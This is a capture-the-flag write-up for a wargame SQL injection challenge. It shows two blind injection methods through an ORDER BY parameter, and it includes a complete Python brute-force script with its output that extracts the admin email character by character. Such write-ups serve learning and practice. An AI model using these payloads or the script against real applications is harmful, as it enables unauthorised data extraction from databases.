---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 24
---

![1](https://github.com/Kunull/Write-ups/assets/110326359/4c5c1b89-930a-41e5-ae0f-a0b7f4fcceab)

We are provided with the SQL queries:

```sql
SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY {$_GET[order]}
```

```sql
SELECT email FROM prob_hell_fire WHERE id='admin' AND email='{$_GET[email]}'`
```

The challenge returns the output in the form of a table.

If we provide the following URI parameter:

```
?order=id
```

The resultant query becomes:

```sql
SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY id
```

![2](https://github.com/Kunull/Write-ups/assets/110326359/d9f2eff9-6616-47e7-b691-7735f440149d)

As we can see there are two users: `admin` and `rubiya`.
In this challenge, the users are sorted in the same way regardless if we order by `id` or `score`.

We can solve this using two different methods:

- [Assigning different sort value](#blind-sql-injection---assigning-different-sort-value)
- [Sorting by ASC or DESC](#blind-sql-injection---sorting-by-adc-or-desc)

## Blind SQL Injection - (Assigning different sort value)

### Retrieving the email length

If we provide the following URI parameter:

```
?order=if(id='admin' AND length(email)=[length], 1, 2)
```

The resultant query becomes:

```sql
SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY if(id='admin' AND length(email)=[length], 1, 2)
```

Rows where the length of `email` for `id='admin'` is equal to the `[length]` that we provide, will be given the sort value 1. 
All other rows will be given the sort value 2. 
Rows with a lower sort value will appear first within the table.

So, if the `admin` user appears first, we know that the `[length]` was correct.

### Leaking the email

If we provide the following URI parameter:

```
?order=if(id='admin' AND substr(email, 1, 1)='0', 1, 2)
```

The resultant query becomes:

```sql
SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY if(id='admin' AND substr(email, [index], 1)='[character]', 1, 2)
```

Rows where the `id='admin'` and character of the `email` at `[index]` is the same as the `[character]` that we provide, will be given the sort value 1. 
All other rows will be given sort value 2. Rows with a lower sort value will appear first within the table.

So, if the `admin` user appears first, we know that the `[character]` at `[index]` was correct.


### Script

```python title="evil_wizard_script.py"
import requests
import urllib.parse
import string

cookies = {'PHPSESSID': 'fgpbvjdctvq3qasns4lba8a85p'}
url = "https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php"
password_length = 0

for x in range(0, 100):
  payload = f"if(id='admin' and length(email)={x}, 1, 2)"
  encoded_payload = urllib.parse.quote_plus(payload)
  full_url = f"{url}?order={encoded_payload}"
    
  response = requests.get(full_url, cookies=cookies)
    
  if "<table border=1><tr><th>id</th><th>email</th><th>score</th><tr><td>admin</td>" in response.text:
    password_length = x
    break

print()    
print(f"[!] Payload: ?order={payload}")
print(f"[!] Payload (URL encoded): ?order={encoded_payload}")
print(f"[!] Email length: {password_length}")

password = ""
searchspace = '_@.' +  string.digits + string.ascii_letters

print(searchspace)

for index in range(1, password_length + 1):
  for char in searchspace:
    payload = f"if(id='admin' AND ord(substr(email, {index}, 1))='{ord(char)}', 1, 2)"
    encoded_payload = urllib.parse.quote_plus(payload)
    full_url = f"{url}?order={encoded_payload}"

    response = requests.get(full_url, cookies=cookies)

    if "<table border=1><tr><th>id</th><th>email</th><th>score</th><tr><td>admin</td>" in response.text:
      password += char
      print()
      print(f"[+] Payload: ?order={payload}")
      print(f"[+] Payload (URL encoded): ?order={encoded_payload}")
      print(f"[+] Character at index {index}: {char}")
      break

print()
print(f"[!] Extracted email: {password}")
print(f"[!] Final payload: ?email={password}")
```

```
$ python .\evil_wizard_script.py

[!] Payload: ?order=if(id='admin' and length(email)=30, 1, 2)
[!] Payload (URL encoded): ?order=if%28id%3D%27admin%27+and+length%28email%29%3D30%2C+1%2C+2%29
[!] Email length: 30
_@.0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 1, 1))='97', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+1%2C+1%29%29%3D%2797%27%2C+1%2C+2%29
[+] Character at index 1: a

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 2, 1))='97', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+2%2C+1%29%29%3D%2797%27%2C+1%2C+2%29
[+] Character at index 2: a

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 3, 1))='115', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+3%2C+1%29%29%3D%27115%27%2C+1%2C+2%29
[+] Character at index 3: s

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 4, 1))='117', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+4%2C+1%29%29%3D%27117%27%2C+1%2C+2%29
[+] Character at index 4: u

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 5, 1))='112', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+5%2C+1%29%29%3D%27112%27%2C+1%2C+2%29
[+] Character at index 5: p

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 6, 1))='51', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+6%2C+1%29%29%3D%2751%27%2C+1%2C+2%29
[+] Character at index 6: 3

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 7, 1))='114', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+7%2C+1%29%29%3D%27114%27%2C+1%2C+2%29
[+] Character at index 7: r

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 8, 1))='95', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+8%2C+1%29%29%3D%2795%27%2C+1%2C+2%29
[+] Character at index 8: _

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 9, 1))='115', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+9%2C+1%29%29%3D%27115%27%2C+1%2C+2%29
[+] Character at index 9: s

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 10, 1))='101', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+10%2C+1%29%29%3D%27101%27%2C+1%2C+2%29
[+] Character at index 10: e

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 11, 1))='99', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+11%2C+1%29%29%3D%2799%27%2C+1%2C+2%29
[+] Character at index 11: c

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 12, 1))='117', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+12%2C+1%29%29%3D%27117%27%2C+1%2C+2%29
[+] Character at index 12: u

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 13, 1))='114', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+13%2C+1%29%29%3D%27114%27%2C+1%2C+2%29
[+] Character at index 13: r

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 14, 1))='101', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+14%2C+1%29%29%3D%27101%27%2C+1%2C+2%29
[+] Character at index 14: e

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 15, 1))='95', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+15%2C+1%29%29%3D%2795%27%2C+1%2C+2%29
[+] Character at index 15: _

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 16, 1))='101', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+16%2C+1%29%29%3D%27101%27%2C+1%2C+2%29
[+] Character at index 16: e

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 17, 1))='109', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+17%2C+1%29%29%3D%27109%27%2C+1%2C+2%29
[+] Character at index 17: m

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 18, 1))='97', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+18%2C+1%29%29%3D%2797%27%2C+1%2C+2%29
[+] Character at index 18: a

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 19, 1))='105', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+19%2C+1%29%29%3D%27105%27%2C+1%2C+2%29
[+] Character at index 19: i

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 20, 1))='108', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+20%2C+1%29%29%3D%27108%27%2C+1%2C+2%29
[+] Character at index 20: l

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 21, 1))='64', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+21%2C+1%29%29%3D%2764%27%2C+1%2C+2%29
[+] Character at index 21: @

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 22, 1))='101', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+22%2C+1%29%29%3D%27101%27%2C+1%2C+2%29
[+] Character at index 22: e

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 23, 1))='109', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+23%2C+1%29%29%3D%27109%27%2C+1%2C+2%29
[+] Character at index 23: m

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 24, 1))='97', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+24%2C+1%29%29%3D%2797%27%2C+1%2C+2%29
[+] Character at index 24: a

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 25, 1))='105', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+25%2C+1%29%29%3D%27105%27%2C+1%2C+2%29
[+] Character at index 25: i

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 26, 1))='49', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+26%2C+1%29%29%3D%2749%27%2C+1%2C+2%29
[+] Character at index 26: 1

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 27, 1))='46', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+27%2C+1%29%29%3D%2746%27%2C+1%2C+2%29
[+] Character at index 27: .

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 28, 1))='99', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+28%2C+1%29%29%3D%2799%27%2C+1%2C+2%29
[+] Character at index 28: c

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 29, 1))='111', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+29%2C+1%29%29%3D%27111%27%2C+1%2C+2%29
[+] Character at index 29: o

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 30, 1))='109', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+30%2C+1%29%29%3D%27109%27%2C+1%2C+2%29
[+] Character at index 30: m

[!] Extracted email: aasup3r_secure_email@emai1.com
[!] Final payload: ?email=aasup3r_secure_email@emai1.com
```

## Blind SQL Injection - (Sorting by ASC or DESC)

### Retrieving the email length

If we provide the following URI parameter:

```
?order=if(id='admin' AND length(email)=[length], '1 ASC', '1 DESC')
```

The resultant query becomes:

```sql
SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY if(id='admin' AND length(email)=[length], '1 ASC', '1 DESC')
```

If the length of `email` for `id='admin'` is equal to the `[length]` that we provide, the rows will be sorted in ascending order. Otherwise, the rows will be sorted in descending order.

So, if the `admin` user appears first, we know that the `[length]` was correct.

### Leaking the email

If we provide the following URI parameter:

```
?order=if(id='admin' AND substr(email, 1, 1)='0', '1 ASC', '1 DESC')
```

The resultant query becomes:

```sql
SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY if(id='admin' AND ord(substr(email, [index], 1))='ord([character])', '1 ASC', '1 DESC')
```

If the `id='admin'` and character of the `email` at `[index]` is the same as the `[character]` that we provide, the rows will be sorted in ascending order. Otherwise, the rows will be sorted in descending order.

So, if the `admin` user appears first, we know that the `[character]` at `[index]` was correct.
